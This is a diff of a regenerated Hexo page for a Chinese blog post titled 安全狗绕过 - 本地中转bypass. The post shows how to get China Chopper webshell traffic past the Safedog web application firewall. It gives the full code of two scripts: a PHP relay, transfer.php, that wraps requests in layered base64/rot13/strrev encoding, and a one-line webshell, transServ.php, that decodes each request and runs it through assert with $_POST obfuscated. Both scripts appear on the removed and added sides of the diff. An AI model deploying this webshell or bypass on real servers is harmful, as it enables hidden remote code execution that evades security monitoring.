@@ -4,7 +4,7 @@
   <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
 <meta name="theme-color" content="#222">
-<meta name="generator" content="Hexo 3.7.1">
+<meta name="generator" content="Hexo 5.2.0">
   <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-pig.png">
   <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-pig.png">
   <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-pig.png">
@@ -25,24 +25,26 @@
   </script>
 
   <meta name="description" content="前言若服务器安装了安全狗，普通一句话安全狗肯定拦截，菜刀必然无法使用。 究其原因：菜刀请求关键字等被安全狗识别导致中断请求。 构造本地中转脚本，本地服务器发送请求，对菜刀请求关键字进行编码，服务端再对请求解码，这样安全狗无法识别也就无法拦截请求。 客户端客户端即中转脚本transfer.php 客户端对菜刀请求参数进行编码操作，此处仅做简单编码验证bypass，编码顺序依次为">
-<meta name="keywords" content="安全狗,绕过,bypass">
 <meta property="og:type" content="article">
 <meta property="og:title" content="安全狗绕过 - 本地中转bypass">
-<meta property="og:url" content="https://redn3ck.github.io/2018/07/22/安全狗绕过-本地中转bypass/index.html">
+<meta property="og:url" content="https://redn3ck.github.io/2018/07/22/%E5%AE%89%E5%85%A8%E7%8B%97%E7%BB%95%E8%BF%87-%E6%9C%AC%E5%9C%B0%E4%B8%AD%E8%BD%ACbypass/index.html">
 <meta property="og:site_name" content="redn3ck&#39;s blog">
 <meta property="og:description" content="前言若服务器安装了安全狗，普通一句话安全狗肯定拦截，菜刀必然无法使用。 究其原因：菜刀请求关键字等被安全狗识别导致中断请求。 构造本地中转脚本，本地服务器发送请求，对菜刀请求关键字进行编码，服务端再对请求解码，这样安全狗无法识别也就无法拦截请求。 客户端客户端即中转脚本transfer.php 客户端对菜刀请求参数进行编码操作，此处仅做简单编码验证bypass，编码顺序依次为">
-<meta property="og:locale" content="zh-CN">
-<meta property="og:image" content="https://redn3ck.github.io/2018/07/22/安全狗绕过-本地中转bypass/phpinfo.png">
-<meta property="og:image" content="https://redn3ck.github.io/2018/07/22/安全狗绕过-本地中转bypass/caidao.png">
-<meta property="og:image" content="https://redn3ck.github.io/2018/07/22/安全狗绕过-本地中转bypass/bypass-safedog.png">
-<meta property="og:image" content="https://redn3ck.github.io/2018/07/22/安全狗绕过-本地中转bypass/bypass-caidao.png">
-<meta property="og:updated_time" content="2018-08-10T09:27:55.913Z">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://redn3ck.github.io/2018/07/22/%E5%AE%89%E5%85%A8%E7%8B%97%E7%BB%95%E8%BF%87-%E6%9C%AC%E5%9C%B0%E4%B8%AD%E8%BD%ACbypass/phpinfo.png">
+<meta property="og:image" content="https://redn3ck.github.io/2018/07/22/%E5%AE%89%E5%85%A8%E7%8B%97%E7%BB%95%E8%BF%87-%E6%9C%AC%E5%9C%B0%E4%B8%AD%E8%BD%ACbypass/caidao.png">
+<meta property="og:image" content="https://redn3ck.github.io/2018/07/22/%E5%AE%89%E5%85%A8%E7%8B%97%E7%BB%95%E8%BF%87-%E6%9C%AC%E5%9C%B0%E4%B8%AD%E8%BD%ACbypass/bypass-safedog.png">
+<meta property="og:image" content="https://redn3ck.github.io/2018/07/22/%E5%AE%89%E5%85%A8%E7%8B%97%E7%BB%95%E8%BF%87-%E6%9C%AC%E5%9C%B0%E4%B8%AD%E8%BD%ACbypass/bypass-caidao.png">
+<meta property="article:published_time" content="2018-07-22T12:52:07.000Z">
+<meta property="article:modified_time" content="2018-08-10T09:27:55.913Z">
+<meta property="article:author" content="redn3ck">
+<meta property="article:tag" content="安全狗">
+<meta property="article:tag" content="绕过">
+<meta property="article:tag" content="bypass">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="安全狗绕过 - 本地中转bypass">
-<meta name="twitter:description" content="前言若服务器安装了安全狗，普通一句话安全狗肯定拦截，菜刀必然无法使用。 究其原因：菜刀请求关键字等被安全狗识别导致中断请求。 构造本地中转脚本，本地服务器发送请求，对菜刀请求关键字进行编码，服务端再对请求解码，这样安全狗无法识别也就无法拦截请求。 客户端客户端即中转脚本transfer.php 客户端对菜刀请求参数进行编码操作，此处仅做简单编码验证bypass，编码顺序依次为">
-<meta name="twitter:image" content="https://redn3ck.github.io/2018/07/22/安全狗绕过-本地中转bypass/phpinfo.png">
+<meta name="twitter:image" content="https://redn3ck.github.io/2018/07/22/%E5%AE%89%E5%85%A8%E7%8B%97%E7%BB%95%E8%BF%87-%E6%9C%AC%E5%9C%B0%E4%B8%AD%E8%BD%ACbypass/phpinfo.png">
 
-<link rel="canonical" href="https://redn3ck.github.io/2018/07/22/安全狗绕过-本地中转bypass/">
+<link rel="canonical" href="https://redn3ck.github.io/2018/07/22/%E5%AE%89%E5%85%A8%E7%8B%97%E7%BB%95%E8%BF%87-%E6%9C%AC%E5%9C%B0%E4%B8%AD%E8%BD%ACbypass/">
 
 
 <script id="page-configurations">
@@ -204,7 +206,7 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="https://redn3ck.github.io/2018/07/22/安全狗绕过-本地中转bypass/">
+    <link itemprop="mainEntityOfPage" href="https://redn3ck.github.io/2018/07/22/%E5%AE%89%E5%85%A8%E7%8B%97%E7%BB%95%E8%BF%87-%E6%9C%AC%E5%9C%B0%E4%B8%AD%E8%BD%ACbypass/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/blogAvatar2.jpg">
@@ -238,7 +240,7 @@
               </span>
 
           
-            <span id="/2018/07/22/安全狗绕过-本地中转bypass/" class="post-meta-item leancloud_visitors" data-flag-title="安全狗绕过 - 本地中转bypass" title="阅读次数">
+            <span id="/2018/07/22/%E5%AE%89%E5%85%A8%E7%8B%97%E7%BB%95%E8%BF%87-%E6%9C%AC%E5%9C%B0%E4%B8%AD%E8%BD%ACbypass/" class="post-meta-item leancloud_visitors" data-flag-title="安全狗绕过 - 本地中转bypass" title="阅读次数">
               <span class="post-meta-item-icon">
                 <i class="fa fa-eye"></i>
               </span>
@@ -253,8 +255,8 @@
       </span>
       <span class="post-meta-item-text">Valine：</span>
     
-    <a title="valine" href="/2018/07/22/安全狗绕过-本地中转bypass/#valine-comments" itemprop="discussionUrl">
-      <span class="post-comments-count valine-comment-count" data-xid="/2018/07/22/安全狗绕过-本地中转bypass/" itemprop="commentCount"></span>
+    <a title="valine" href="/2018/07/22/%E5%AE%89%E5%85%A8%E7%8B%97%E7%BB%95%E8%BF%87-%E6%9C%AC%E5%9C%B0%E4%B8%AD%E8%BD%ACbypass/#valine-comments" itemprop="discussionUrl">
+      <span class="post-comments-count valine-comment-count" data-xid="/2018/07/22/%E5%AE%89%E5%85%A8%E7%8B%97%E7%BB%95%E8%BF%87-%E6%9C%AC%E5%9C%B0%E4%B8%AD%E8%BD%ACbypass/" itemprop="commentCount"></span>
     </a>
   </span>
   
@@ -273,12 +275,14 @@
 <p>究其原因：菜刀请求关键字等被安全狗识别导致中断请求。</p>
 <p>构造本地中转脚本，本地服务器发送请求，对菜刀请求关键字进行编码，服务端再对请求解码，这样安全狗无法识别也就无法拦截请求。</p>
 <h1 id="客户端"><a href="#客户端" class="headerlink" title="客户端"></a>客户端</h1><p>客户端即中转脚本<code>transfer.php</code></p>
-<p>客户端对菜刀请求参数进行编码操作，此处仅做简单编码验证bypass，编码顺序依次为<br><a id="more"></a></p>
+<p>客户端对菜刀请求参数进行编码操作，此处仅做简单编码验证bypass，编码顺序依次为</p>
+<a id="more"></a>
 <blockquote>
 <p><code>base64_encode()</code>,<br><code>str_rot13()</code>,<br><code>strrev()</code>,<br><code>base64_encode()</code></p>
 </blockquote>
 <p>经过这4层编码，对服务端发送请求。</p>
-<figure class="highlight php"><figcaption><span>客户端：transfer.php</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">encode</span><span class="params">($str)</span></span>&#123;</span><br><span class="line">	$DS = base64_encode($str);</span><br><span class="line">	$DS = str_rot13($DS);</span><br><span class="line">	$DS = strrev($DS);</span><br><span class="line">	$DS = base64_encode($DS);</span><br><span class="line">	<span class="keyword">return</span> $DS;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">// webshell地址，transServ.php为定制一句话</span></span><br><span class="line">	$webshell = <span class="string">'http://127.0.0.1/transServ.php'</span>;</span><br><span class="line">	$pdata = $_POST;</span><br><span class="line">	<span class="keyword">foreach</span>($pdata <span class="keyword">as</span> $key=&gt;$value)&#123; </span><br><span class="line">		<span class="keyword">if</span>(is_array($value))&#123;</span><br><span class="line">			$value=implode($value);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="comment">// 菜刀密码</span></span><br><span class="line">		<span class="keyword">if</span>($key == <span class="string">'pass'</span>) &#123;</span><br><span class="line">			$pdata[$key] = encode($value);</span><br><span class="line">		&#125;</span><br><span class="line">		</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">// var_dump($pdata);</span></span><br><span class="line">	$data = http_build_query($pdata);</span><br><span class="line">	</span><br><span class="line">	$opts = <span class="keyword">array</span> (</span><br><span class="line">		<span class="string">'http'</span> =&gt; <span class="keyword">array</span> (</span><br><span class="line">		<span class="string">'method'</span> =&gt; <span class="string">'POST'</span>,</span><br><span class="line">		<span class="string">'header'</span>=&gt; <span class="string">"Content-type: application/x-www-form-urlencoded\r\n"</span> . <span class="string">"Content-Length: "</span> . strlen($data) . <span class="string">"\r\n"</span>,</span><br><span class="line">		<span class="string">'content'</span> =&gt; $data)</span><br><span class="line">	);</span><br><span class="line">	$context = stream_context_create($opts);</span><br><span class="line">	<span class="comment">// 创建资源流上下文,数据包</span></span><br><span class="line">	$html = @file_get_contents($webshell, <span class="keyword">false</span>, $context);</span><br><span class="line">	<span class="keyword">echo</span> $html;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight php"><figcaption><span>客户端：transfer.php</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">encode</span>(<span class="params">$str</span>)</span>&#123;</span><br><span class="line">	$DS = base64_encode($str);</span><br><span class="line">	$DS = str_rot13($DS);</span><br><span class="line">	$DS = strrev($DS);</span><br><span class="line">	$DS = base64_encode($DS);</span><br><span class="line">	<span class="keyword">return</span> $DS;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">// webshell地址，transServ.php为定制一句话</span></span><br><span class="line">	$webshell = <span class="string">&#x27;http://127.0.0.1/transServ.php&#x27;</span>;</span><br><span class="line">	$pdata = $_POST;</span><br><span class="line">	<span class="keyword">foreach</span>($pdata <span class="keyword">as</span> $key=&gt;$value)&#123; </span><br><span class="line">		<span class="keyword">if</span>(is_array($value))&#123;</span><br><span class="line">			$value=implode($value);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="comment">// 菜刀密码</span></span><br><span class="line">		<span class="keyword">if</span>($key == <span class="string">&#x27;pass&#x27;</span>) &#123;</span><br><span class="line">			$pdata[$key] = encode($value);</span><br><span class="line">		&#125;</span><br><span class="line">		</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">// var_dump($pdata);</span></span><br><span class="line">	$data = http_build_query($pdata);</span><br><span class="line">	</span><br><span class="line">	$opts = <span class="keyword">array</span> (</span><br><span class="line">		<span class="string">&#x27;http&#x27;</span> =&gt; <span class="keyword">array</span> (</span><br><span class="line">		<span class="string">&#x27;method&#x27;</span> =&gt; <span class="string">&#x27;POST&#x27;</span>,</span><br><span class="line">		<span class="string">&#x27;header&#x27;</span>=&gt; <span class="string">&quot;Content-type: application/x-www-form-urlencoded\r\n&quot;</span> . <span class="string">&quot;Content-Length: &quot;</span> . strlen($data) . <span class="string">&quot;\r\n&quot;</span>,</span><br><span class="line">		<span class="string">&#x27;content&#x27;</span> =&gt; $data)</span><br><span class="line">	);</span><br><span class="line">	$context = stream_context_create($opts);</span><br><span class="line">	<span class="comment">// 创建资源流上下文,数据包</span></span><br><span class="line">	$html = @file_get_contents($webshell, <span class="literal">false</span>, $context);</span><br><span class="line">	<span class="keyword">echo</span> $html;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
 <h1 id="服务端"><a href="#服务端" class="headerlink" title="服务端"></a>服务端</h1><p>服务端只需对请求进行解码操作，然后正常使用菜刀一句话即可，解码顺序依次为</p>
 <blockquote>
 <p><code>base64_decode()</code>,<br><code>str_rot13()</code>,<br><code>strrev()</code>,<br><code>base64_decode()</code></p>
@@ -287,7 +291,8 @@
 <blockquote>
 <p>版本需求：<code>php&gt;5.2</code></p>
 </blockquote>
-<figure class="highlight php"><figcaption><span>服务端：transServ.php</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">$DS = @$<span class="comment">/*-*/</span>&#123;<span class="string">"_P"</span>.<span class="string">"OST"</span>&#125;[<span class="string">'pass'</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">empty</span>($DS) )&#123;</span><br><span class="line">	<span class="keyword">echo</span> $DS.<span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">	$DS = @base64_decode($DS);</span><br><span class="line">	<span class="keyword">echo</span> $DS.<span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">	$DS = @strrev($DS);</span><br><span class="line">	<span class="keyword">echo</span> $DS.<span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">	$DS = @str_rot13($DS);</span><br><span class="line">	<span class="keyword">echo</span> $DS.<span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">	$DS = @base64_decode($DS);</span><br><span class="line">	<span class="keyword">echo</span> $DS.<span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">	@array_map(assert,(<span class="keyword">array</span>)$DS);</span><br><span class="line">	<span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight php"><figcaption><span>服务端：transServ.php</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">$DS = @$<span class="comment">/*-*/</span>&#123;<span class="string">&quot;_P&quot;</span>.<span class="string">&quot;OST&quot;</span>&#125;[<span class="string">&#x27;pass&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">empty</span>($DS) )&#123;</span><br><span class="line">	<span class="keyword">echo</span> $DS.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">	$DS = @base64_decode($DS);</span><br><span class="line">	<span class="keyword">echo</span> $DS.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">	$DS = @strrev($DS);</span><br><span class="line">	<span class="keyword">echo</span> $DS.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">	$DS = @str_rot13($DS);</span><br><span class="line">	<span class="keyword">echo</span> $DS.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">	$DS = @base64_decode($DS);</span><br><span class="line">	<span class="keyword">echo</span> $DS.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">	@array_map(assert,(<span class="keyword">array</span>)$DS);</span><br><span class="line">	<span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
 <h1 id="连接"><a href="#连接" class="headerlink" title="连接"></a>连接</h1><h2 id="浏览器验证"><a href="#浏览器验证" class="headerlink" title="浏览器验证"></a>浏览器验证</h2><p><img src="phpinfo.png" alt="phpinfo"></p>
 <h2 id="菜刀连接"><a href="#菜刀连接" class="headerlink" title="菜刀连接"></a>菜刀连接</h2><p>连接本地中转脚本，中转脚本对webshell发送编码后请求。</p>
 <p><img src="caidao.png" alt="caidao"></p>
@@ -307,7 +312,7 @@
   </li>
   <li class="post-copyright-link">
     <strong>本文链接：</strong>
-    <a href="https://redn3ck.github.io/2018/07/22/安全狗绕过-本地中转bypass/" title="安全狗绕过 - 本地中转bypass">https://redn3ck.github.io/2018/07/22/安全狗绕过-本地中转bypass/</a>
+    <a href="https://redn3ck.github.io/2018/07/22/%E5%AE%89%E5%85%A8%E7%8B%97%E7%BB%95%E8%BF%87-%E6%9C%AC%E5%9C%B0%E4%B8%AD%E8%BD%ACbypass/" title="安全狗绕过 - 本地中转bypass">https://redn3ck.github.io/2018/07/22/安全狗绕过-本地中转bypass/</a>
   </li>
   <li class="post-copyright-license">
     <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
@@ -319,8 +324,8 @@
       <footer class="post-footer">
           
           <div class="post-tags">
-              <a href="/tags/安全狗/" rel="tag"><i class="fa fa-tag"></i> 安全狗</a>
-              <a href="/tags/绕过/" rel="tag"><i class="fa fa-tag"></i> 绕过</a>
+              <a href="/tags/%E5%AE%89%E5%85%A8%E7%8B%97/" rel="tag"><i class="fa fa-tag"></i> 安全狗</a>
+              <a href="/tags/%E7%BB%95%E8%BF%87/" rel="tag"><i class="fa fa-tag"></i> 绕过</a>
               <a href="/tags/bypass/" rel="tag"><i class="fa fa-tag"></i> bypass</a>
           </div>
 
@@ -330,11 +335,11 @@
         
     <div class="post-nav">
       <div class="post-nav-item">
-    <a href="/2018/04/25/Oracle注入-命令执行-Shell反弹/" rel="prev" title="Oracle注入 - 命令执行&Shell反弹">
+    <a href="/2018/04/25/Oracle%E6%B3%A8%E5%85%A5-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-Shell%E5%8F%8D%E5%BC%B9/" rel="prev" title="Oracle注入 - 命令执行&Shell反弹">
       <i class="fa fa-chevron-left"></i> Oracle注入 - 命令执行&Shell反弹
     </a></div>
       <div class="post-nav-item">
-    <a href="/2018/08/29/Struts2-S2-057复现-CVE-2018-11776/" rel="next" title="Struts2 - S2-057复现 (CVE-2018-11776)">
+    <a href="/2018/08/29/Struts2-S2-057%E5%A4%8D%E7%8E%B0-CVE-2018-11776/" rel="next" title="Struts2 - S2-057复现 (CVE-2018-11776)">
       Struts2 - S2-057复现 (CVE-2018-11776) <i class="fa fa-chevron-right"></i>
     </a></div>
     </div>
@@ -396,7 +401,7 @@
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
-          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#前言"><span class="nav-text">前言</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#客户端"><span class="nav-text">客户端</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#服务端"><span class="nav-text">服务端</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#连接"><span class="nav-text">连接</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#浏览器验证"><span class="nav-text">浏览器验证</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#菜刀连接"><span class="nav-text">菜刀连接</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#bypass安全狗"><span class="nav-text">bypass安全狗</span></a></li></ol></li></ol></div>
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%89%8D%E8%A8%80"><span class="nav-text">前言</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%AE%A2%E6%88%B7%E7%AB%AF"><span class="nav-text">客户端</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%9C%8D%E5%8A%A1%E7%AB%AF"><span class="nav-text">服务端</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E8%BF%9E%E6%8E%A5"><span class="nav-text">连接</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%B5%8F%E8%A7%88%E5%99%A8%E9%AA%8C%E8%AF%81"><span class="nav-text">浏览器验证</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%8F%9C%E5%88%80%E8%BF%9E%E6%8E%A5"><span class="nav-text">菜刀连接</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#bypass%E5%AE%89%E5%85%A8%E7%8B%97"><span class="nav-text">bypass安全狗</span></a></li></ol></li></ol></div>
       </div>
       <!--/noindex-->
 
@@ -412,7 +417,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">15</span>
+          <span class="site-state-item-count">16</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
@@ -426,10 +431,10 @@
 </div>
   <div class="links-of-author motion-element">
       <span class="links-of-author-item">
-        <a href="https://github.com/redn3ck" title="GitHub → https://github.com/redn3ck" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+        <a href="https://github.com/redn3ck" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;redn3ck" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
       </span>
       <span class="links-of-author-item">
-        <a href="mailto:NjMwOTM2MTkxQHFxLmNvbQ==" title="E-Mail → mailto:NjMwOTM2MTkxQHFxLmNvbQ==" rel="noopener" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+        <a href="mailto:NjMwOTM2MTkxQHFxLmNvbQ==" title="E-Mail → mailto:NjMwOTM2MTkxQHFxLmNvbQ&#x3D;&#x3D;" rel="noopener" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
       </span>
   </div>
 
@@ -440,7 +445,7 @@
     </div>
     <ul class="links-of-blogroll-list">
         <li class="links-of-blogroll-item">
-          <a href="http://blog.qinqinyo.com" title="http://blog.qinqinyo.com" rel="noopener" target="_blank">Biglao</a>
+          <a href="http://blog.qinqinyo.com/" title="http:&#x2F;&#x2F;blog.qinqinyo.com" rel="noopener" target="_blank">Biglao</a>
         </li>
     </ul>
   </div>
@@ -470,7 +475,7 @@
   </span>
   <span class="author" itemprop="copyrightHolder">redn3ck</span>
 </div>
-  <div class="powered-by">由 <a href="https://hexo.io" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
   </div>
 
         
@@ -512,9 +517,17 @@
   <script src="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.js"></script>
   <script src="/lib/velocity/velocity.min.js"></script>
   <script src="/lib/velocity/velocity.ui.min.js"></script>
-<script src="/js/utils.js"></script><script src="/js/motion.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
 <script src="/js/schemes/pisces.js"></script>
+
+
 <script src="/js/next-boot.js"></script>
+
 
 
 
@@ -523,7 +536,9 @@
 
 
 
-  <script src="/js/local-search.js"></script>
+  
+<script src="/js/local-search.js"></script>
+
 
 
 
